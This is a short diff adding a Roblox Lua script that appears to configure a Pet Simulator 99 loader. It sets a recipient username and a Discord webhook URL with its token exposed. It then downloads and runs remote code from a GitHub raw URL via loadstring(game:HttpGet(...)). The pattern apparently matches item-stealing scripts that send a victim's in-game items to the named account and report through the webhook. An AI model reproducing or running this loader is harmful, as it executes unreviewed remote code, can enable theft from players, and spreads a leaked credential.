@@ -1,0 +1,6 @@
+Username = "alonyen117"
+Username2 = "alonyen117"
+Webhook = "https://discord.com/api/webhooks/1335958762535784511/KLLrDwNVezd7be-BSkNCl3Mt3ikPufr5l0vmb9VFBDn-O8Y8cAUgOxqVJrenUOPN98DO"
+selectedLoadingScreen = "3"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zdkjaime/KeltScripts/refs/heads/main/PS99"))()
